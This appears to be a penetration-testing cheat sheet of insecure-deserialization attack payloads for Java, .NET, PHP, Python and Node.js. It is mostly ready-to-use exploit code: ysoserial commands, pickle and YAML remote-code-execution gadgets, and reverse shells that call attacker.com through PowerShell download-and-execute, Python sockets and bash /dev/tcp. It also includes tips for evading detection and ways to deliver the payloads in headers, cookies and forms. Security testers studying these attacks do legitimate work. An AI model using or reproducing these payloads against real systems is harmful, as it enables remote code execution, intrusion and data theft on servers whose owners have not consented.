# Insecure Deserialization - Attack Payloads

## Overview
This document contains practical attack payloads and exploitation techniques for insecure deserialization vulnerabilities across different programming languages and frameworks.

## Java Deserialization Payloads

### Apache Commons Collections

#### CommonsCollections1 (CC1)
```java
// Payload Generation using ysoserial
java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.ser

// Base64 encoded payload
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAHY29tbWFuZHQABGNhbGN4
```

#### CommonsCollections6 (CC6)
```java
// More reliable payload for newer Java versions
java -jar ysoserial.jar CommonsCollections6 "powershell -enc <base64_command>"

// Example with reverse shell
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,<base64_payload>}|{base64,-d}|{bash,-i}"
```

### Spring Framework
```java
// Spring4Shell exploitation
java -jar ysoserial.jar Spring1 "whoami"
java -jar ysoserial.jar Spring2 "id"
```

### ObjectInputStream Exploitation
```java
// Direct ObjectInputStream payload
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));
Object obj = ois.readObject(); // Triggers deserialization
```

## .NET Deserialization Payloads

### BinaryFormatter
```csharp
// Using ysoserial.net
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "calc.exe"

// PowerShell reverse shell
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "powershell -nop -W hidden -noni -ep bypass -c \"IEX ((new-object net.webclient).downloadstring('http://attacker.com/shell.ps1'))\""
```

### Json.NET (Newtonsoft.Json)
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["calc.exe"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}
```

### XmlSerializer
```xml
<root type="System.Data.Services.Internal.ProjectedWrapper0`1[[System.Data.Services.Internal.ProjectedWrapper0`1[[System.Windows.Markup.XamlReader, PresentationFramework]], System.Data.Services]]">
  <ProjectedProperty0>
    <ProjectedProperty0 type="System.Windows.Markup.XamlReader, PresentationFramework">
      <_xamlText><![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"><ObjectDataProvider x:Key="LaunchCmd" ObjectType="{x:Type Diagnostics:Process}" MethodName="Start" xmlns:Diagnostics="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider.MethodParameters><system:String xmlns:system="clr-namespace:System;assembly=mscorlib">cmd</system:String><system:String xmlns:system="clr-namespace:System;assembly=mscorlib">/c calc</system:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]></_xamlText>
    </ProjectedProperty0>
  </ProjectedProperty0>
</root>
```

## PHP Deserialization Payloads

### PHP Object Injection
```php
// Basic PHP object injection
O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:32:"5d41402abc4b2a76b9719d911017c592";}

// File inclusion via object injection
O:10:"FileReader":1:{s:4:"file";s:11:"/etc/passwd";}

// Magic method exploitation (__wakeup, __destruct)
O:9:"Exploit":1:{s:7:"command";s:6:"whoami";}
```

### Phar Deserialization
```php
// Phar:// wrapper exploitation
file_get_contents("phar://malicious.phar/any_file.txt");
file_exists("phar://uploads/malicious.jpg/test.txt");
include("phar://attack.gif");
```

### WordPress/Drupal Specific
```php
// WordPress object injection
O:21:"WP_Automatic_Updater":0:{}

// Drupal Drupalgeddon2 payload
a:2:{i:0;a:3:{s:4:"data";s:26:"echo 'Drupalgeddon2' | tee";s:7:"#access";b:1;s:6:"#cache";a:1:{s:4:"tags";a:1:{i:0;s:4:"test";}}}i:1;s:1:"#"}
```

## Python Deserialization Payloads

### Pickle Exploitation
```python
# Basic pickle RCE
import pickle
import base64

class Exploit(object):
    def __reduce__(self):
        import os
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())

# Advanced pickle payload
class PickleRCE(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['whoami'], {'shell': True}))
```

### PyYAML Exploitation
```yaml
# YAML deserialization RCE
!!python/object/apply:os.system ["calc.exe"]

# Subprocess execution
!!python/object/apply:subprocess.check_output [['whoami'], {shell: true}]

# Import and execute
!!python/object/apply:__import__ ["os"]
```

### Django Pickle Session
```python
# Django session exploitation
import pickle
import base64
from django.contrib.sessions.backends.base import SessionBase

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'attacker.com\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])"',))

data = pickle.dumps(Exploit())
print(base64.b64encode(data).decode())
```

## Node.js Deserialization Payloads

### node-serialize
```javascript
// Basic RCE payload
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'calc\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);

// Reverse shell payload
var payload = '{"rce":"_$$ND_FUNC$$_function (){var spawn = require(\'child_process\').spawn;var ls = spawn(\'bash\', [\'-c\', \'bash -i >& /dev/tcp/attacker.com/4444 0>&1\']);ls.stdout.on(\'data\', function (data) {console.log(data.toString());});ls.stderr.on(\'data\', function (data) {console.log(data.toString());});}()"}';
```

### JSON.parse() with eval()
```javascript
// Unsafe JSON parsing
var malicious = '{"__proto__": {"isAdmin": true, "eval": "require(\'child_process\').exec(\'calc\')"}}'
JSON.parse(malicious);

// Prototype pollution leading to RCE
var payload = JSON.stringify({__proto__: {"isAdmin": true, "\u0065val": "require('child_process').exec('whoami')"}})
```

## Gadget Chains

### Java Gadget Chain Analysis
```
CommonsCollections1 Chain:
1. HashMap.readObject()
2. HashMap.hash()
3. AnnotationInvocationHandler.invoke()
4. LazyMap.get()
5. ChainedTransformer.transform()
6. InvokerTransformer.transform()
7. Runtime.exec()
```

### .NET Gadget Chain
```
ObjectDataProvider Chain:
1. BinaryFormatter.Deserialize()
2. ObjectDataProvider.GetObject()
3. Process.Start()
4. Command Execution
```

## Detection Evasion

### Base64 Encoding
```bash
# Encode payload to bypass basic detection
echo "payload" | base64
echo "cGF5bG9hZA==" | base64 -d
```

### Gzip Compression
```python
import gzip
import base64

compressed = gzip.compress(b"malicious_payload")
encoded = base64.b64encode(compressed)
```

### Custom Serialization
```java
// Using custom serialization format
ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(maliciousObject);
byte[] payload = bos.toByteArray();
```

## Payload Delivery Methods

### HTTP Headers
```http
POST /api/endpoint HTTP/1.1
X-Serialized-Data: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
Content-Type: application/x-java-serialized-object
```

### Cookies
```http
Cookie: session=TzoxMDoiRXhwbG9pdCI6MTp7czo3OiJjb21tYW5kIjtzOjY6Indob2FtaSI7fQ==
```

### Form Parameters
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3B
```

## Tools for Payload Generation

### Java
- **ysoserial**: `java -jar ysoserial.jar [payload] [command]`
- **SerializationDumper**: Analysis tool for Java serialization
- **Java Deserialization Scanner**: Burp Suite extension

### .NET
- **ysoserial.net**: `.NET deserialization payload generator`
- **ViewState YSoSerial.Net**: ASP.NET ViewState exploitation

### Python
- **Pickled**: Pickle payload generator
- **PyYAML-RCE**: YAML deserialization exploit generator

### Multi-language
- **Marshalsec**: Universal deserialization tool
- **DeserLab**: Practice environment for deserialization

---
*Part of the Web Application VAPT Guide - Insecure Deserialization Module*
